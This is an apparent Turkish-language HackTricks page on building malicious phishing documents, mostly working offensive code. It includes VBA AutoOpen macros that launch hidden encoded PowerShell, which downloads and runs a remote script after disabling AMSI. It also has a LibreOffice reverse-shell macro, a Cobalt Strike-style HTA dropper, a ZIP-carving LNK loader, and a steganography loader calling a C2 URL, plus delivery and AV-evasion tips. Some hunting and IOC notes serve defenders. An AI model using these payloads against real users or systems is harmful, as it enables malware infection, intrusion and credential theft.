# Phishing Dosyaları ve Belgeleri

{{#include ../../banners/hacktricks-training.md}}

## Office Belgeleri

Microsoft Word, bir dosyayı açmadan önce dosya verilerini doğrular. Veri doğrulama, OfficeOpenXML standardına göre veri yapısı tanımlama biçiminde gerçekleştirilir. Veri yapısı tanımlama sırasında herhangi bir hata oluşursa analiz edilen dosya açılmaz.

Genellikle macro içeren Word dosyaları `.docm` uzantısını kullanır. Ancak dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve macro çalıştırma yeteneklerini korumak mümkündür.\
Örneğin, bir RTF dosyası tasarımı gereği macro desteklemez; ancak RTF olarak yeniden adlandırılmış bir DOCM dosyası Microsoft Word tarafından işlenir ve macro çalıştırabilir.\
Aynı iç işleyiş ve mekanizmalar Microsoft Office Suite'teki tüm yazılımlar için geçerlidir (Excel, PowerPoint vb.).

Bazı Office programları tarafından hangi uzantıların çalıştırılacağını kontrol etmek için aşağıdaki komutu kullanabilirsiniz:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### External Image Load

Şuraya gidin: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture ve **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Şuraya gidin: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Belgeden rastgele kod çalıştırmak için macros kullanmak mümkündür.

#### Autoload functions

Ne kadar yaygın olurlarsa, AV tarafından algılanma olasılıkları da o kadar yüksek olur.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Manually remove metadata

**File > Info > Inspect Document > Inspect Document** yolunu izleyin; bu, Document Inspector'ı açar. **Inspect** düğmesine, ardından **Document Properties and Personal Information** seçeneğinin yanındaki **Remove All** düğmesine tıklayın.

#### Doc Extension

İşiniz bittiğinde **Save as type** açılır menüsünü seçin ve formatı **`.docx`** yerine Word 97-2003 **`.doc`** olarak değiştirin.\
Bunu yapın; çünkü **`.docx` içine macro'ları kaydedemezsiniz** ve macro-enabled **`.docm`** extension'ı çevresinde bir **stigma** vardır (ör. thumbnail icon'ında büyük bir `!` bulunur ve bazı web/email gateway'leri bunları tamamen engeller). Bu nedenle, bu **legacy `.doc` extension en iyi uzlaşmadır**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer documents, Basic macros embed edebilir ve macro'yu **Open Document** event'ine bağlayarak dosya açıldığında otomatik olarak çalıştırabilir (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Basit bir reverse shell macro'su şöyledir:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
`...==""")` ile biten payload'lar hem iç komutun hem de Shell argümanının dengeli kalmasını sağlar.

Teslimat ipuçları:

- `.odt` olarak kaydedin ve macro'yu document event'e bağlayın; böylece document açıldığında hemen çalışır.
- `swaks` ile email gönderirken `--attach @resume.odt` kullanın (`@` gereklidir; böylece attachment olarak dosya adı string'i değil, dosya byte'ları gönderilir). Bu, doğrulama olmadan rastgele `RCPT TO` alıcılarını kabul eden SMTP server'larını abuse ederken kritiktir.

## HTA Dosyaları

HTA, **HTML ve scripting language'larını (VBScript ve JScript gibi) birleştiren** bir Windows programıdır. User interface'i oluşturur ve browser'ın security model'inin kısıtlamaları olmadan "fully trusted" bir application olarak çalışır.

HTA, genellikle **Internet Explorer** ile birlikte **installed** olan **`mshta.exe`** kullanılarak çalıştırılır; bu da **`mshta`'nın IE'ye dependant** olduğu anlamına gelir. Bu nedenle IE uninstalled edilmişse HTA'lar çalıştırılamaz.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Authentication'ı Zorlama

**NTLM authentication'ı "uzaktan" zorlamanın** çeşitli yolları vardır; örneğin kullanıcının erişeceği e-postalara veya HTML içeriklerine **görünmez görseller** ekleyebilirsiniz (HTTP MitM bile olabilir). Ya da kurbanı, yalnızca klasörü **açmasıyla** bir **authentication** işlemini **tetikleyecek** dosya **adreslerine** yönlendirebilirsiniz.

**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda inceleyin:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Yalnızca hash'i veya authentication bilgisini çalamayacağınızı, aynı zamanda **NTLM relay attacks** gerçekleştirebileceğinizi unutmayın:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Son derece etkili kampanyalar, iki meşru decoy belgesi (PDF/DOCX) ve kötü amaçlı bir .lnk içeren bir ZIP gönderir. Buradaki trick, asıl PowerShell loader'ının ZIP'in raw bytes verileri içinde benzersiz bir marker'dan sonra saklanması ve .lnk dosyasının bunu memory'de tamamen carve edip çalıştırmasıdır.<sup>[[2]](#references)</sup>

.lnk PowerShell one-liner'ının uyguladığı typical flow:

1) Orijinal ZIP'i yaygın path'lerde bulun: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve mevcut working directory'nin parent directory'si.
2) ZIP bytes verilerini okuyun ve hardcoded bir marker bulun (ör. xFIQCV). Marker'dan sonraki her şey embedded PowerShell payload'ıdır.
3) ZIP'i %ProgramData%'ya kopyalayın, orada extract edin ve legitimate görünmek için decoy .docx'i açın.
4) Mevcut process için AMSI'yi bypass edin: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Sonraki stage'in obfuscation'ını kaldırın (ör. tüm # karakterlerini silin) ve bunu memory'de execute edin.

Embedded stage'i carve edip çalıştırmak için örnek PowerShell skeleton:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notlar
- Delivery genellikle itibarlı PaaS subdomain'lerini (ör. *.herokuapp.com) kötüye kullanır ve payload'ları filtreleyebilir (IP/UA'ya göre benign ZIP'ler sunar).
- Sonraki stage çoğunlukla base64/XOR shellcode'un şifresini çözer ve disk üzerindeki izleri en aza indirmek için bunu Reflection.Emit + VirtualAlloc aracılığıyla execute eder.

Aynı chain'de kullanılan Persistence
- Microsoft Web Browser control'ünün COM TypeLib hijacking'i; böylece IE/Explorer veya bunu embed eden herhangi bir app payload'ı otomatik olarak yeniden başlatır.<sup>[[2]](#references)[[4]](#references)</sup> Ayrıntılara ve kullanıma hazır command'lere buradan ulaşabilirsiniz:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Archive data'nın sonuna eklenmiş ASCII marker string'i (ör. xFIQCV) içeren ZIP dosyaları.
- ZIP'i bulmak için parent/user folder'larını enumerate eden ve bir decoy document açan .lnk.
- [System.Management.Automation.AmsiUtils]::amsiInitFailed aracılığıyla AMSI tampering.
- Trusted PaaS domain'leri altında host edilen linklerle sona eren uzun süreli business thread'leri.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Tekrarlanan başka bir pattern, arka planda gerçek chain'i stage ederken aynı anda benign bir lure açan **document-impersonating `.lnk`** dosyasıdır.<sup>[[3]](#references)</sup>

Gözlemlenen workflow:
1. Shortcut **PDF gibi masquerade eder** ve obfuscated bir PowerShell downloader spawn etmek için `conhost.exe` veya benzer bir proxy kullanır.
2. PowerShell, belirgin token'ları (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) fragment'lara ayırır; böylece `iwr`, `gci`, `ren`, `cpi` veya `schtasks` arayan naive detection'lar command'i kaçırır.
3. Stager önce **decoy document'i download eder**, victim için açar ve ardından malicious file'ları arka planda yeniden oluşturur.
4. Payload'lar **junk extension'larla** yazılabilir ve ardından filler character'lar çıkarılarak rename edilebilir; bu da belirgin `.exe` / `.cpl` artifact'lerinin ortaya çıkmasını geciktirir.
5. Persistence, user-writable bir path'ten trusted host binary başlatan **minute-based scheduled task** ile oluşturulur.

Bu pattern'den elde edilen temel hunting ipuçları:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Tanımak için yararlı bir staging düzeni:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` veya `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### İkinci aşama neden stealthy

Rapid7 vaka çalışmasında scheduled task, **`Fondue.exe`** dosyasını `C:\Users\Public\` konumundan tekrar tekrar çalıştırıyordu. **`APPWIZ.cpl`** dosyası bunun yanında staging edildiği ve **`RunFODW`** export edildiği için trusted Microsoft binary, legitimate system copy yerine attacker CPL dosyasını side-load etti.

CPL ardından:
- `C:\Windows\Tasks\editor.dat` konumundaki bir **AES-256-CBC** blob'unu okur
- **Windows CNG / `bcrypt.dll`** üzerinden decrypt eder
- Executable memory allocate eder ve decrypt edilmiş shellcode'u kopyalar
- Shellcode pointer'ını **`EnumUILanguagesW`** için callback olarak geçirerek execution'ı indirect biçimde gerçekleştirir

Bu son adım ayrıca ayrı olarak hunting yapılmaya değer: Malware çoğu zaman doğrudan `((void(*)())buf)()` jump işleminden kaçınır ve bunun yerine execution'ı devretmek için **legitimate callback-taking WinAPI** işlevlerini abuse eder.

Bu campaign'deki decrypted payload, final PE'yi tamamen memory içinde map eden ve execution'ı devretmeden önce mevcut process içinde **AMSI/WLDP/ETW** patch'leyen **Donut** shellcode'uydu. Side-loading ve memory-resident post-processing hakkında daha ayrıntılı notlar için bkz.:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pratik hunting pivot'ları:
- `powershell.exe` veya `conhost.exe` spawn eden ve ardından görünür bir decoy document açan `.lnk`.
- **`C:\Users\Public\`** konumuna yapılan kısa ömürlü download'lar ve ardından nonsense extension'larından immediate rename işlemleri.
- `GoogleErrorReport` gibi bland isimlere sahip ve **user-writable directories** içinden execution gerçekleştiren scheduled task'lar.
- Aynı non-system directory içindeki **`.cpl` / `.dll`** dosyalarını load eden trusted binary'ler.
- **`C:\Windows\Tasks\`** altında yazılan ve ardından side-loaded module tarafından okunan Base64 text blob'ları.

## Görsellerde steganography-delimited payload'lar (PowerShell stager)

Recent loader chain'ler, obfuscated bir JavaScript/VBS teslim eder; bu JavaScript/VBS, Base64 PowerShell stager'ını decode edip çalıştırır. Bu stager bir image (çoğunlukla GIF) download eder. Bu image, unique start/end marker'ları arasında plain text olarak gizlenmiş Base64-encoded bir .NET DLL içerir. Script bu delimiter'ları arar (gerçek dünyada görülen örnekler: «<<sudo_png>> … <<sudo_odt>>>»), aradaki text'i extract eder, Base64-decode ederek bytes'a dönüştürür, assembly'yi in-memory load eder ve bilinen bir entry method'u C2 URL ile çağırır.<sup>[[5]](#references)</sup>

İş Akışı
- Stage 1: Archived JS/VBS dropper → embedded Base64'i decode eder → `-nop -w hidden -ep bypass` parametreleriyle PowerShell stager'ını launch eder.
- Stage 2: PowerShell stager → image download eder, marker-delimited Base64'ü carve eder, .NET DLL'yi in-memory load eder ve method'unu (ör. VAI) C2 URL'sini ve options'ları geçirerek çağırır.
- Stage 3: Loader final payload'ı retrieve eder ve genellikle process hollowing yoluyla trusted binary içine (yaygın olarak MSBuild.exe) inject eder.<sup>[[7]](#references)[[8]](#references)</sup> Process hollowing ve trusted utility proxy execution hakkında daha fazla bilgi için buraya bakın:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Bir image'dan DLL carve etmek ve bir .NET method'unu in-memory invoke etmek için PowerShell örneği:

<details>
<summary>PowerShell stego payload extractor ve loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notlar
- Bu, ATT&CK T1027.003 (steganography/marker-hiding) tekniğidir.<sup>[[6]](#references)</sup> İşaretçiler kampanyalara göre değişir.
- AMSI/ETW bypass ve string deobfuscation, assembly yüklenmeden önce yaygın olarak uygulanır.
- Hunting: indirilen görselleri bilinen ayraçlar için tarayın; görsellere erişen ve hemen Base64 blob'larını decode eden PowerShell işlemlerini belirleyin.

Ayrıca stego araçlarına ve carving tekniklerine bakın:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Yaygın bir initial stage, bir archive içinde teslim edilen küçük ve yoğun biçimde obfuscate edilmiş bir `.js` veya `.vbs` dosyasıdır. Tek amacı, gömülü bir Base64 string'ini decode etmek ve HTTPS üzerinden sonraki stage'i başlatmak üzere `-nop -w hidden -ep bypass` parametreleriyle PowerShell çalıştırmaktır.<sup>[[5]](#references)</sup>

İskelet mantık (özet):
- Kendi dosya içeriğini oku
- Junk string'ler arasındaki bir Base64 blob'unu bul
- ASCII PowerShell'e decode et
- `powershell.exe`'yi çağıran `wscript.exe`/`cscript.exe` ile çalıştır

Hunting ipuçları
- Komut satırında `-enc`/`FromBase64String` kullanarak `powershell.exe` başlatan archive içindeki JS/VBS ekleri.
- Kullanıcı temp path'lerinden `powershell.exe -nop -w hidden` başlatan `wscript.exe`.

## NTLM hash'lerini çalmak için Windows dosyaları

**NTLM creds çalınabilecek yerler** hakkındaki sayfayı inceleyin:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: ABD şirketlerini hedefleyen gelişmiş bir phishing saldırısı](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Çin temalı bir loader chain üzerinden Dropping Elephant tradecraft'ının izlenmesi](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Yeni COM persistence tekniği (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader çok çeşitli infostealer'lar teslim ediyor](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
